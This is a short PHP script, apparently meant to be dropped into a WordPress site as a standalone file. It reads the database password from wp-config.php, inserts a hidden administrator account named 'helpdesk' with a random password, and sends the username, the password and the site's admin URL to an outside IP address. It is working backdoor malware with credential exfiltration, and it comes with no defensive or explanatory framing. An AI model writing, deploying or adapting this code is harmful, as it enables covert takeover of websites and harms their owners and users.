<?php
// dropped as a standalone script, no plugin hook
$cfg = file_get_contents(dirname(__FILE__) . '/../wp-config.php');
preg_match("/'DB_PASSWORD'\s*,\s*'(.+?)'/", $cfg, $m);
$db = new mysqli('localhost', 'root', $m[1], 'wp');
$pw = substr(md5(mt_rand()), 0, 12);
$h = password_hash($pw, PASSWORD_DEFAULT);
$t = 'wpx_';
$db->query("INSERT INTO {$t}users (user_login, user_pass, user_email, user_registered) VALUES ('helpdesk', '$h', 'h@x.io', NOW())");
$id = $db->insert_id;
$db->query("INSERT INTO {$t}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$t}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
$payload = http_build_query(array('username' => 'helpdesk', 'password' => $pw, 'admin_url' => 'https://' . $_SERVER['HTTP_HOST'] . '/wp-admin/'));
$c = curl_init('http://45.13.22.91/collect.php');
curl_setopt($c, CURLOPT_POSTFIELDS, $payload);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_exec($c);
